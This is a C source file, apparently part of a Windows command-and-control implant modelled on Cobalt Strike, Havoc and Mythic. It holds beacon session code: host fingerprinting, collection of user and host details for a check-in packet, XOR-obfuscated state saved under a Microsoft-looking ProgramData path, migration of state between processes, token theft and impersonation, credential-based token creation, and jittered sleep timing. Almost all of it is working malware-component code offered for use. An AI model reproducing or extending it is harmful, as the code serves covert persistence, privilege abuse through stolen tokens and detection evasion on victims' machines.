/*
 * Session Management - Beacon state tracking
 * Cobalt Strike, Havoc, Mythic patterns
 */

#include <windows.h>

// ============================================================================
// SESSION STRUCTURE
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD  bid;
    BYTE   key[32];
    DWORD  lastseen;
    DWORD  sleep;
    BYTE   jitter;
    DWORD  pid;
    char   host[64];
    char   user[64];
    char   dom[64];
    char   proc[256];
    DWORD  integ;
    BYTE   ip[4];
    DWORD  os;
    DWORD  arch;
} SESSION;
#pragma pack(pop)

SESSION g_sess = {0};

// ============================================================================
// ID GENERATION
// ============================================================================

DWORD gen_bid(void)
{
    DWORD id = 0;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    id ^= si.dwProcessorType;
    id ^= si.dwNumberOfProcessors << 8;

    DWORD serial;
    GetVolumeInformationA("C:\\", 0, 0, &serial, 0, 0, 0, 0);
    id ^= serial;

    char host[64];
    DWORD sz = sizeof(host);
    GetComputerNameA(host, &sz);
    for(DWORD i = 0; host[i]; i++) id = id * 31 + host[i];

    id ^= GetCurrentProcessId();
    id ^= GetTickCount() & 0xFFFF;

    return id;
}

// ============================================================================
// SESSION INIT
// ============================================================================

void sess_init(void)
{
    g_sess.bid = gen_bid();

    DWORD tick = GetTickCount();
    for(int i = 0; i < 32; i++)
        g_sess.key[i] = (BYTE)((tick >> (i % 4) * 8) ^ i);

    g_sess.sleep = 5000;
    g_sess.jitter = 20;
    g_sess.pid = GetCurrentProcessId();

    DWORD sz = sizeof(g_sess.host);
    GetComputerNameA(g_sess.host, &sz);

    sz = sizeof(g_sess.user);
    GetUserNameA(g_sess.user, &sz);

    GetModuleFileNameA(0, g_sess.proc, sizeof(g_sess.proc));

    HANDLE hT;
    if(OpenProcessToken(GetCurrentProcess(), 8, &hT)) {
        DWORD len;
        GetTokenInformation(hT, 25, 0, 0, &len);
        BYTE* buf = HeapAlloc(GetProcessHeap(), 0, len);
        if(GetTokenInformation(hT, 25, buf, len, &len)) {
            TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)buf;
            g_sess.integ = *GetSidSubAuthority(tml->Label.Sid,
                           *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        }
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hT);
    }

    OSVERSIONINFOW ov = {sizeof(ov)};
    GetVersionExW(&ov);
    g_sess.os = (ov.dwMajorVersion << 16) | ov.dwMinorVersion;

#ifdef _WIN64
    g_sess.arch = 64;
#else
    g_sess.arch = 32;
#endif
}

// ============================================================================
// SESSION PERSISTENCE
// ============================================================================

#define SESS_PATH "C:\\ProgramData\\Microsoft\\sess.dat"

BOOL sess_save(void)
{
    HANDLE hF = CreateFileA(SESS_PATH, 0x40000000, 0, 0, 2, 2, 0);
    if(hF == INVALID_HANDLE_VALUE) return 0;

    BYTE buf[sizeof(SESSION)];
    for(DWORD i = 0; i < sizeof(SESSION); i++)
        buf[i] = ((BYTE*)&g_sess)[i] ^ 0x42;

    DWORD wr;
    WriteFile(hF, buf, sizeof(SESSION), &wr, 0);
    CloseHandle(hF);
    return 1;
}

BOOL sess_load(void)
{
    HANDLE hF = CreateFileA(SESS_PATH, 0x80000000, 1, 0, 3, 0, 0);
    if(hF == INVALID_HANDLE_VALUE) return 0;

    BYTE buf[sizeof(SESSION)];
    DWORD rd;
    ReadFile(hF, buf, sizeof(SESSION), &rd, 0);
    CloseHandle(hF);

    if(rd != sizeof(SESSION)) return 0;

    for(DWORD i = 0; i < sizeof(SESSION); i++)
        ((BYTE*)&g_sess)[i] = buf[i] ^ 0x42;

    g_sess.pid = GetCurrentProcessId();
    g_sess.lastseen = 0;

    return 1;
}

void sess_delete(void)
{
    DeleteFileA(SESS_PATH);
}

// ============================================================================
// HEARTBEAT
// ============================================================================

void sess_heartbeat(void)
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    g_sess.lastseen = ft.dwLowDateTime;
}

BOOL sess_stale(DWORD timeout)
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    return (ft.dwLowDateTime - g_sess.lastseen) > timeout * 10000000;
}

// ============================================================================
// CRYPTO
// ============================================================================

void sess_encrypt(BYTE* d, DWORD l)
{
    for(DWORD i = 0; i < l; i++)
        d[i] ^= g_sess.key[i % 32];
}

void sess_decrypt(BYTE* d, DWORD l)
{
    sess_encrypt(d, l);
}

// ============================================================================
// KEY ROTATION
// ============================================================================

void sess_rotate_key(void)
{
    BYTE new[32];
    DWORD ts = GetTickCount();

    for(int i = 0; i < 32; i++) {
        new[i] = g_sess.key[i] ^ ((ts >> ((i % 4) * 8)) & 0xFF);
    }

    for(int i = 0; i < 32; i++)
        g_sess.key[i] = new[i];
}

// ============================================================================
// CHECKIN PACKET
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD magic;
    DWORD bid;
    DWORD pid;
    DWORD integ;
    DWORD os;
    BYTE  arch;
    char  host[64];
    char  user[64];
    char  dom[64];
    char  proc[256];
    BYTE  ip[4];
} CHECKIN_PKT;
#pragma pack(pop)

void build_checkin(CHECKIN_PKT* pkt)
{
    pkt->magic = 0xDEADBEEF;
    pkt->bid = g_sess.bid;
    pkt->pid = g_sess.pid;
    pkt->integ = g_sess.integ;
    pkt->os = g_sess.os;
    pkt->arch = (BYTE)g_sess.arch;

    char* s = g_sess.host; char* d = pkt->host;
    while(*s) *d++ = *s++; *d = 0;

    s = g_sess.user; d = pkt->user;
    while(*s) *d++ = *s++; *d = 0;

    s = g_sess.dom; d = pkt->dom;
    while(*s) *d++ = *s++; *d = 0;

    s = g_sess.proc; d = pkt->proc;
    while(*s) *d++ = *s++; *d = 0;

    for(int i = 0; i < 4; i++) pkt->ip[i] = g_sess.ip[i];
}

// ============================================================================
// MIGRATION
// ============================================================================

BOOL sess_prepare_migrate(BYTE** state, DWORD* len)
{
    *len = sizeof(SESSION);
    *state = HeapAlloc(GetProcessHeap(), 0, *len);

    for(DWORD i = 0; i < sizeof(SESSION); i++)
        (*state)[i] = ((BYTE*)&g_sess)[i];

    sess_encrypt(*state, *len);
    return 1;
}

BOOL sess_restore_migrate(BYTE* state, DWORD len)
{
    if(len != sizeof(SESSION)) return 0;

    sess_decrypt(state, len);

    for(DWORD i = 0; i < sizeof(SESSION); i++)
        ((BYTE*)&g_sess)[i] = state[i];

    g_sess.pid = GetCurrentProcessId();
    GetModuleFileNameA(0, g_sess.proc, sizeof(g_sess.proc));

    return 1;
}

// ============================================================================
// TOKEN MANAGEMENT
// ============================================================================

HANDLE g_token = 0;

BOOL sess_steal_token(DWORD pid)
{
    HANDLE hProc = OpenProcess(0x0400, 0, pid);  // PROCESS_QUERY_INFORMATION
    if(!hProc) return 0;

    HANDLE hToken;
    if(!OpenProcessToken(hProc, 0x0002, &hToken)) {  // TOKEN_DUPLICATE
        CloseHandle(hProc);
        return 0;
    }

    HANDLE hDup;
    if(!DuplicateTokenEx(hToken, 0x02000000, 0, 2, 1, &hDup)) {
        CloseHandle(hToken);
        CloseHandle(hProc);
        return 0;
    }

    if(g_token) CloseHandle(g_token);
    g_token = hDup;

    CloseHandle(hToken);
    CloseHandle(hProc);
    return 1;
}

BOOL sess_impersonate(void)
{
    if(!g_token) return 0;
    return ImpersonateLoggedOnUser(g_token);
}

BOOL sess_revert(void)
{
    return RevertToSelf();
}

BOOL sess_make_token(WCHAR* user, WCHAR* dom, WCHAR* pass)
{
    HANDLE hToken;
    if(!LogonUserW(user, dom, pass, 9, 0, &hToken))  // LOGON32_LOGON_NEW_CREDENTIALS
        return 0;

    if(g_token) CloseHandle(g_token);
    g_token = hToken;
    return 1;
}

// ============================================================================
// SLEEP CONFIG
// ============================================================================

void sess_set_sleep(DWORD sleep, BYTE jitter)
{
    g_sess.sleep = sleep;
    g_sess.jitter = jitter;
}

DWORD sess_get_sleep(void)
{
    DWORD base = g_sess.sleep;
    DWORD range = (base * g_sess.jitter) / 100;
    DWORD jitter = GetTickCount() % (range * 2 + 1);
    return base - range + jitter;
}

// ============================================================================
// EOF
// ============================================================================
